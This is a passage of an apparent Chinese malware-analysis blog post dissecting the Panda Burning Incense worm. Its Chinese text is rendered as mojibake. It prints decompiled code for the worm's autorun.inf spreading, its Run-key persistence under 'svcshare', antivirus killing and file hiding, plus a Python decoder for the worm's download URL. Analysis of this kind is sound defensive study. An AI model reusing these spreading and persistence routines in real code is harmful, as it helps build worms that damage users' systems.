class="hljs-params">(&amp;System::AnsiString_1)</span>;<span class="hljs-comment">// å­—ç¬¦ä¸²é‡Šæ”¾å®Œæ¯•</span><br>  GetRootPath((<span class="hljs-type">int</span>)&amp;v40, a1, a2, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)lpFileName);<span class="hljs-comment">// è·å–å¯åˆ©ç”¨çš„æ ¹ç›®å½•</span><br>  <span class="hljs-keyword">if</span> ( v40 )<br>  &#123;<br>    __strlen = unknown_libname_113(v40);        <span class="hljs-comment">// ç­‰äºstrlen</span><br>    <span class="hljs-keyword">if</span> ( __strlen &gt;= <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">do</span>                                        <span class="hljs-comment">// å¯¹å¯åˆ©ç”¨çš„ç›˜ç¬¦æ ¹ç›®å½•å¾ªç¯æ“ä½œï¼Œæ’é™¤Aã€Bç›˜ç¬¦</span><br>      &#123;<br>        unknown_libname_108((<span class="hljs-type">int</span>)v33);<br>        Sysutils::AnsiUpperCase(v33[<span class="hljs-number">0</span>]);        <span class="hljs-comment">// å…¨å¤§å†™</span><br>        v22 = (_BYTE *)v33[<span class="hljs-number">1</span>];<br>        Sysutils::AnsiUpperCase((<span class="hljs-type">const</span> <span class="hljs-type">int</span>)System::AnsiString_10);<br>        <span class="hljs-keyword">if</span> ( !__linkproc__ LStrPos((_BYTE *)v32[<span class="hljs-number">2</span>], v22) )<span class="hljs-comment">// æ’é™¤Aã€B</span><br>        &#123;<br>          unknown_libname_108((<span class="hljs-type">int</span>)v32);<br>          Sysutils::AnsiUpperCase(v32[<span class="hljs-number">0</span>]);<br>          v23 = (_BYTE *)v32[<span class="hljs-number">1</span>];<br>          Sysutils::AnsiUpperCase((<span class="hljs-type">const</span> <span class="hljs-type">int</span>)System::AnsiString_11);<br>          <span class="hljs-keyword">if</span> ( !__linkproc__ LStrPos((_BYTE *)v31[<span class="hljs-number">1</span>], v23) )<br>          &#123;<br>            unknown_libname_108((<span class="hljs-type">int</span>)v31);<br>            System::__linkproc__ <span class="hljs-title function_">LStrCat3</span><span class="hljs-params">(&amp;System::AnsiString, v31[<span class="hljs-number">0</span>], aSetupExe_0)</span>;<span class="hljs-comment">// &quot;:\\setup.exe&quot;</span><br>            unknown_libname_108((<span class="hljs-type">int</span>)&amp;v30);<br>            System::__linkproc__ <span class="hljs-title function_">LStrCat3</span><span class="hljs-params">(&amp;System::AnsiString_1, v30, aAutorunInf)</span>;<span class="hljs-comment">// &quot;:\\autorun.inf&quot;</span><br>            <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)Sysutils::FileExists(System::AnsiString) )<span class="hljs-comment">// åˆ¤æ–­C:\\setup.exeæ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨ï¼Œè¿›å…¥ä»¥ä¸‹ifåˆ†æ”¯</span><br>            &#123;<br>              System::ParamStr(<span class="hljs-number">0</span>);<br>              OpenAndRead_File(v29[<span class="hljs-number">1</span>], &amp;v37, __strlen, a2, (<span class="hljs-type">int</span>)lpFileName);<span class="hljs-comment">// æ‰“å¼€å¹¶è¯»å–C:\Windows\System32\drivers\spo0lsv.exe</span><br>              OpenAndRead_File(System::AnsiString, &amp;v36, __strlen, a2, (<span class="hljs-type">int</span>)lpFileName);<span class="hljs-comment">// æ‰“å¼€å¹¶è¯»å–C:\\setup.exe</span><br>              System::__linkproc__ <span class="hljs-title function_">LStrCmp</span><span class="hljs-params">(v37, v36)</span>;<span class="hljs-comment">// æ¯”è¾ƒå·²å­˜åœ¨çš„C:\\setup.exeå’ŒC:\Windows\System32\drivers\spo0lsv.exeçš„å†…å®¹æ˜¯å¦ç›¸åŒï¼Œä¸åŒï¼Œåˆ™åˆ é™¤åŸC:\\setup.exeï¼ŒæŠŠC:\Windows\System32\drivers\spo0lsv.exeå¤åˆ¶è¿‡æ¥</span><br>              <span class="hljs-keyword">if</span> ( !v4 )<br>              &#123;<br>                lpFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(System::AnsiString);<br>                SetFileAttributesA(lpFileName, <span class="hljs-number">0x80</span>u);<br>                <span class="hljs-keyword">if</span> ( !DeleteFileA(lpFileName) )<br>                  <span class="hljs-keyword">break</span>;<br>                unknown_libname_108((<span class="hljs-type">int</span>)v29);<br>                System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(v29, aSetupExe_0)</span>;<span class="hljs-comment">// &quot;:\\setup.exe&quot;</span><br>                lpNewFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v29[<span class="hljs-number">0</span>]);<br>                System::ParamStr(<span class="hljs-number">0</span>);<br>                lpExistingFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v28[<span class="hljs-number">1</span>]);<br>                <span class="hljs-keyword">if</span> ( !CopyFileA(lpExistingFileName, lpNewFileName, <span class="hljs-number">0</span>) )<br>                  <span class="hljs-keyword">break</span>;<br>              &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>                                <span class="hljs-comment">// è‹¥C:\\setup.exeä¸å­˜åœ¨</span><br>            &#123;<br>              unknown_libname_108((<span class="hljs-type">int</span>)v28);<br>              System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(v28, aSetupExe_0)</span>;<span class="hljs-comment">// &quot;:\\setup.exe&quot;</span><br>              lpNewFileName_1 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v28[<span class="hljs-number">0</span>]);<br>              System::ParamStr(<span class="hljs-number">0</span>);<br>              lpExistingFileName_1 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v27[<span class="hljs-number">1</span>]);<br>              <span class="hljs-keyword">if</span> ( !CopyFileA(lpExistingFileName_1, lpNewFileName_1, <span class="hljs-number">0</span>) )<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)Sysutils::FileExists(System::AnsiString_1) )<span class="hljs-comment">// åˆ¤æ–­C:\\autorun.infæ˜¯å¦å­˜åœ¨ï¼Œå…·ä½“é€»è¾‘åŒä¸Š</span><br>            &#123;                                   <span class="hljs-comment">// è‹¥å­˜åœ¨</span><br>              OpenAndRead_File(System::AnsiString_1, &amp;v35, __strlen, a2, (<span class="hljs-type">int</span>)lpFileName);<br>              System::__linkproc__ <span class="hljs-title function_">LStrCmp</span><span class="hljs-params">(v35, aAutorunOpenSet)</span>;<span class="hljs-comment">// å·²å­˜åœ¨çš„C:\\autorun.infå…¶å†…å®¹æ˜¯å¦ç­‰äº&quot;[AutoRun]\r\nOPEN=setup.exe\r\nshellexecute=setup.exe\r\nshell\\Auto\\command=setup.exe\r\n&quot;</span><br>              <span class="hljs-keyword">if</span> ( !v4 )                        <span class="hljs-comment">// è‹¥ä¸ç­‰ï¼Œåˆ™åˆ é™¤ï¼Œé‡æ–°åˆ›å»ºå†™å…¥</span><br>              &#123;<br>                lpFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(System::AnsiString_1);<br>                SetFileAttributesA(lpFileName, <span class="hljs-number">0x80</span>u);<br>                <span class="hljs-keyword">if</span> ( !DeleteFileA(lpFileName) )<br>                  <span class="hljs-keyword">break</span>;<br>                FileA_0 = CreateFileA_0(lpFileName, <span class="hljs-number">0x40000000</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2u</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>                CloseHandle_0(FileA_0);<br>                System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v34, System::AnsiString_1)</span>;<br>                *off_40E2BC = <span class="hljs-number">2</span>;<br>                v8 = System::__linkproc__ Append(v34);<br>                System::__linkproc__ _IOTest(v8);<br>                _[AutoRun]_r_nOPEN_setup.exe_r_nshellexecute_setup.exe_r_nshell = System::__linkproc__ WriteLString(<br>                                                                                    (<span class="hljs-type">int</span>)v34,<br>                                                                                    (<span class="hljs-type">int</span>)aAutorunOpenSet);<span class="hljs-comment">// &quot;[AutoRun]\r\nOPEN=setup.exe\r\nshellexecute=setup.exe\r\nshell\\Auto\\command=setup.exe\r\n&quot;</span><br>                v10 = System::__linkproc__ Flush(_[AutoRun]_r_nOPEN_setup.exe_r_nshellexecute_setup.exe_r_nshell);<br>                System::__linkproc__ _IOTest(v10);<br>                v11 = System::__linkproc__ Close(v34);<br>                System::__linkproc__ _IOTest(v11);<br>              &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>                                <span class="hljs-comment">// ä¸å­˜åœ¨ï¼Œç›´æ¥åˆ›å»ºå†™å…¥</span><br>            &#123;<br>              lpFileName_1 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(System::AnsiString_1);<br>              hObject = CreateFileA_0(lpFileName_1, <span class="hljs-number">0x40000000</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2u</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>              CloseHandle_0(hObject);<br>              System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v34, System::AnsiString_1)</span>;<br>              *off_40E2BC = <span class="hljs-number">2</span>;<br>              v14 = System::__linkproc__ Append(v34);<br>              System::__linkproc__ _IOTest(v14);<br>              _[AutoRun]_r_nOPEN_setup.exe_r_nshellexecute_setup.exe_r_nshell_1 = System::__linkproc__ WriteLString(<br>                                                                                    (<span class="hljs-type">int</span>)v34,<br>                                                                                    (<span class="hljs-type">int</span>)aAutorunOpenSet);<span class="hljs-comment">// &quot;[AutoRun]\r\nOPEN=setup.exe\r\nshellexecute=setup.exe\r\nshell\\Auto\\command=setup.exe\r\n&quot;</span><br>              v16 = System::__linkproc__ Flush(_[AutoRun]_r_nOPEN_setup.exe_r_nshellexecute_setup.exe_r_nshell_1);<br>              System::__linkproc__ _IOTest(v16);<br>              v17 = System::__linkproc__ Close(v34);<br>              System::__linkproc__ _IOTest(v17);<br>            &#125;<br>            unknown_libname_108((<span class="hljs-type">int</span>)v27);      <span class="hljs-comment">// è®¾ç½®æ–‡ä»¶å±æ€§</span><br>            System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(v27, aSetupExe_0)</span>;<span class="hljs-comment">// &quot;:\\setup.exe&quot;</span><br>            lpFileName_2 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v27[<span class="hljs-number">0</span>]);<br>            SetFileAttributesA(lpFileName_2, <span class="hljs-number">7u</span>);<br>            lpFileName_3 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(System::AnsiString_1);<br>            SetFileAttributesA(lpFileName_3, <span class="hljs-number">7u</span>);<br>          &#125;<br>        &#125;<br>        --__strlen;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( __strlen );<br>    &#125;<br>  &#125;<br>  __writefsdword(<span class="hljs-number">0</span>, v24[<span class="hljs-number">0</span>]);<br>  __writefsdword(<span class="hljs-number">0</span>, v25[<span class="hljs-number">0</span>]);<br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(&amp;loc_40C2CD)</span>;<span class="hljs-comment">// æ¸…ç©ºå­—ç¬¦ä¸²æ•°ç»„</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(v26)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sub-40BACC"><a href="#sub-40BACC" class="headerlink" title="sub_40BACC"></a>sub_40BACC</h3><p>æ­¤å¤„å¼€å§‹ä¸€ä¸ªçº¿ç¨‹</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002104934.png"></p><p>ç‚¹è¿›sub_40ba8cï¼Œå†è¿›å…¥sub_40b864</p><p>å¾ˆæ˜æ˜¾çš„ç½‘ç»œè¡Œä¸º</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002110548.png"></p><h3 id="å…·ä½“æµç¨‹-1"><a href="#å…·ä½“æµç¨‹-1" class="headerlink" title="å…·ä½“æµç¨‹"></a>å…·ä½“æµç¨‹</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002183427.png"></p><h2 id="sub-40d088"><a href="#sub-40d088" class="headerlink" title="sub_40d088"></a>sub_40d088</h2><p>è®¾ç½®äº†6ä¸ªå®šæ—¶å™¨ï¼Œæœ€çŸ­çš„1ç§’ï¼Œæœ€é•¿çš„30åˆ†é’Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002174206.png"></p><h3 id="sub-40CEE4"><a href="#sub-40CEE4" class="headerlink" title="sub_40CEE4"></a>sub_40CEE4</h3><p>ä¸»è¦æ˜¯ä¿®æ”¹æ³¨å†Œè¡¨å¯åŠ¨é¡¹çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __stdcall <span class="hljs-title function_">sub_40CEE4</span><span class="hljs-params">()</span><br>&#123;<br>  _DWORD v0[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp-Ch] [ebp-14h] BYREF</span><br>  <span class="hljs-type">int</span> *v1; <span class="hljs-comment">// [esp-4h] [ebp-Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+0h] [ebp-8h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+4h] [ebp-4h] BYREF</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+8h] [ebp+0h] BYREF</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  v2 = <span class="hljs-number">0</span>;<br>  v1 = &amp;savedregs;<br>  v0[<span class="hljs-number">1</span>] = &amp;loc_40CF69;<br>  v0[<span class="hljs-number">0</span>] = NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v0);<br>  sub_406E2C(v0[<span class="hljs-number">0</span>], &amp;loc_40CF69, &amp;savedregs);   <span class="hljs-comment">// æ€è½¯æ£€æµ‹å¹¶å…³é—­</span><br>  GetSystemDirectory((<span class="hljs-type">int</span> *)&amp;v2);               <span class="hljs-comment">// è¿”å›C:\Windows\System32</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v3, <span class="hljs-number">3</span>)</span>;        <span class="hljs-comment">// å¾—åˆ°æºç—…æ¯’è·¯å¾„</span><br>  v1 = (<span class="hljs-type">int</span> *)System::__linkproc__ LStrToPChar(v3);<br>  sub_4051BC(                                   <span class="hljs-comment">// å°†æºç—…æ¯’è·¯å¾„å†™å…¥å¯åŠ¨é¡¹</span><br>    (LPCSTR)<span class="hljs-number">0x80000001</span>,<br>    aSoftwareMicros,                            <span class="hljs-comment">// &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span><br>    (BYTE *)aSvcshare);                         <span class="hljs-comment">// &quot;svcshare&quot;</span><br>  sub_4059F0(                                   <span class="hljs-comment">// å°†æ–‡ä»¶å±æ€§è®¾ç½®ä¸ºéšè—</span><br>    <span class="hljs-number">-2147483646</span>,<br>    SOFTWARE__Microsoft__Windows__CurrentVersion__Explorer__Advance,<span class="hljs-comment">// &quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL\\CheckedValue&quot;</span><br>    <span class="hljs-number">0</span>);<br>  __writefsdword(<span class="hljs-number">0</span>, v2);<br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(&amp;loc_40CF70)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002120619.png"></p><h3 id="sub-40d040"><a href="#sub-40d040" class="headerlink" title="sub_40d040"></a>sub_40d040</h3><p>å¥—å¨ƒ</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002120817.png"></p><p>åˆ›å»ºçº¿ç¨‹sub_40c9b0ï¼Œè¿›å»çœ‹çœ‹</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002120850.png"></p><p>å†…éƒ¨çš„åŠŸèƒ½æ˜¯è®¿é—®ä¸€ä¸ªurlï¼Œä¸‹è½½æ¶æ„ä»£ç å¹¶æ‰§è¡Œ</p><p>è¿™ä¸ªurlæ˜¯åŠ å¯†åç¡¬ç¼–ç åœ¨ç¨‹åºä¸­</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002171027.png"></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002170941.png"></p><h4 id="sub-40c4ec"><a href="#sub-40c4ec" class="headerlink" title="sub_40c4ec"></a>sub_40c4ec</h4><p>è¿›å…¥è¿™ä¸ªè§£å¯†å‡½æ•°çœ‹çœ‹ï¼Œä¼ªä»£ç å±‚é¢çœ‹ä¸å‡ºæ¥åŠ å¯†è¿‡ç¨‹ï¼Œéœ€è¦çœ‹æ±‡ç¼–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __usercall decode_url@&lt;eax&gt;(<br>        <span class="hljs-type">int</span> a1@&lt;eax&gt;,<br>        <span class="hljs-type">int</span> a2@&lt;edx&gt;,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a3@&lt;ebx&gt;,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a4@&lt;edi&gt;,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a5@&lt;esi&gt;)<br>&#123;<br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp-18h] [ebp-2Ch] BYREF</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [esp+0h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+4h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [esp+8h] [ebp-Ch] BYREF</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+Ch] [ebp-8h]</span><br>  <span class="hljs-type">int</span> encryp_url; <span class="hljs-comment">// [esp+10h] [ebp-4h] BYREF</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+14h] [ebp+0h] BYREF</span><br><br>  v11 = <span class="hljs-number">0</span>;<br>  v10 = <span class="hljs-number">0</span>;<br>  v9 = <span class="hljs-number">0</span>;<br>  v8[<span class="hljs-number">5</span>] = a3;<br>  v8[<span class="hljs-number">4</span>] = a5;<br>  v8[<span class="hljs-number">3</span>] = a4;<br>  v12 = a2;<br>  encryp_url = a1;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAddRef</span><span class="hljs-params">(a1)</span>;<br>  v8[<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v8[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40C5C1;<br>  v8[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v8);<br>  <span class="hljs-keyword">if</span> ( encryp_url )<br>  &#123;<br>    System::__linkproc__ <span class="hljs-title function_">LStrLAsg</span><span class="hljs-params">(&amp;v10, aXboy)</span>; <span class="hljs-comment">// &quot;xboy&quot;</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;v11)</span>;         <span class="hljs-comment">// ç”³è¯·ä¸€ä¸ªå­—ç¬¦ä¸²ç©ºé—´</span><br>    v5 = unknown_libname_113(encryp_url);       <span class="hljs-comment">// åŠ å¯†urlçš„é•¿åº¦</span><br>    <span class="hljs-keyword">if</span> ( v5 &gt; <span class="hljs-number">0</span> )<br>    &#123;<br>      v6 = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        unknown_libname_113(v10);               <span class="hljs-comment">// &quot;xboy&quot;çš„é•¿åº¦4</span><br>        unknown_libname_108((<span class="hljs-type">int</span>)&amp;v9);<br>        System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(&amp;v11, v9)</span>;<br>        ++v6;<br>        --v5;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v5 );<br>    &#125;<br>    System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(v12, v11)</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    System::__linkproc__ LStrClr(v12);<br>  &#125;<br>  __writefsdword(<span class="hljs-number">0</span>, v8[<span class="hljs-number">0</span>]);<br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(&amp;loc_40C5C8)</span>;<br>  <span class="hljs-keyword">return</span> System::__linkproc__ LStrClr(&amp;encryp_url);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">seg000:0040C550                 call    unknown_libname_113 ; BDS 2005-2007 and Delphi6-7 Visual Component Library<br>seg000:0040C550                                         ; Delphi 5 Visual Component Library<br>seg000:0040C555                 push    eax<br>seg000:0040C556                 mov     eax, ebx<br>seg000:0040C558                 pop     edx<br>seg000:0040C559                 mov     ecx, edx<br>seg000:0040C55B                 cdq<br>seg000:0040C55C                 idiv    ecx<br>seg000:0040C55E                 mov     edi, edx<br>seg000:0040C560                 inc     edi<br>seg000:0040C561                 mov     eax, [ebp+var_10]<br>seg000:0040C564                 movzx   eax, byte ptr [eax+edi-1]<br>seg000:0040C569                 mov     ecx, 0Ah<br>seg000:0040C56E                 xor     edx, edx<br>seg000:0040C570                 div     ecx<br>seg000:0040C572                 mov     eax, [ebp+encryp_url]<br>seg000:0040C575                 movzx   eax, byte ptr [eax+ebx-1]<br>seg000:0040C57A                 xor     edx, eax<br>seg000:0040C57C                 lea     eax, [ebp+var_14]<br></code></pre></td></tr></table></figure><p>ç»™å‡ºpythonçš„è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">key = <span class="hljs-string">&quot;xboy&quot;</span><br>encrypt_data = <br>decode_data = []<br>magic_num = <span class="hljs-number">10</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encrypt_data)):<br>    decode_data.append(<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(key[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">4</span>]) % magic_num) ^ encrypt_data[i]))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(decode_data))<br></code></pre></td></tr></table></figure><h3 id="sub-40d048"><a href="#sub-40d048" class="headerlink" title="sub_40d048"></a>sub_40d048</h3><p>åˆ›å»ºä¸¤ä¸ªçº¿ç¨‹ï¼Œç¬¬ä¸€ä¸ªå’Œsub_40d040ä¸€æ ·ï¼›ç¬¬äºŒä¸ªåˆ™æ˜¯å…³é—­ç½‘ç»œå…±äº«</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002171719.png"></p><h4 id="sub-40cdec"><a href="#sub-40cdec" class="headerlink" title="sub_40cdec"></a>sub_40cdec</h4><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002171851.png"></p><h3 id="sub-407430"><a href="#sub-407430" class="headerlink" title="sub_407430"></a>sub_407430</h3><p>å¥—å¨ƒ</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002172012.png"></p><p>åœæ­¢ã€åˆ é™¤windwosæœåŠ¡ï¼Œåˆ é™¤æ€è½¯å¯åŠ¨é¡¹</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002173433.png"></p><h3 id="sub-40cc4c"><a href="#sub-40cc4c" class="headerlink" title="sub_40cc4c"></a>sub_40cc4c</h3><p>è®¿é—®å‡ ä¸ªå¸¸è§ç½‘ç«™</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002173614.png"></p><h3 id="sub-40c728"><a href="#sub-40c728" class="headerlink" title="sub_40c728"></a>sub_40c728</h3><p>åŒæ ·çš„ä¸‹è½½æ¶æ„ä»£ç å¹¶æ‰§è¡Œï¼Œå°±æ˜¯urlä¸ä¸€æ ·</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002173828.png"></p><h3 id="å…·ä½“æµç¨‹-2"><a href="#å…·ä½“æµç¨‹-2" class="headerlink" title="å…·ä½“æµç¨‹"></a>å…·ä½“æµç¨‹</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002175446.png"></p><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/xiongmao.vir.png"></p><h1 id="0xff-å†™åœ¨æœ€å"><a href="#0xff-å†™åœ¨æœ€å" class="headerlink" title="0xff.å†™åœ¨æœ€å"></a>0xff.å†™åœ¨æœ€å</h1><p>ç¬”è€…èŠ±äº†ä¸¤å¤©æ—¶é—´ï¼Œç²—ç•¥çš„æŠŠè¿™ä¸ªè€å¤è‘£ç»™åˆ†æäº†ä¸€ä¸‹</p><p>æŒºæœ‰æ„æ€çš„ï¼Œâ€œå°è€Œç²¾è‡´â€ç”¨æ¥è¯„ä»·ç†ŠçŒ«çƒ§é¦™é¼ é¼ è§‰å¾—æ²¡å•¥å¤§é—®é¢˜</p><p>åŒæ—¶ç¬”è€…ä¹Ÿæœ‰å€Ÿå£ä¸¤å¤©ä¸çœ‹è¡Œæµ‹ç”³è®ºè¿™ç§exç©æ„äº†ğŸ˜‹</p><p>è¿˜æ˜¯å–œæ¬¢è¿™ç§å…´è¶£ä¸»å¯¼çš„å­¦ä¹ ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­</p><p>ä½†æ˜¯é¼ é¼ è¿˜æ˜¯æ²¡è§£å†³æ€ä¹ˆ5.0çš„ç«ç»’å‰‘ä¸€è·‘å°±å´©çš„é—®é¢˜ğŸ‘Š</p><h1 id="Refer"><a href="#Refer" class="headerlink" 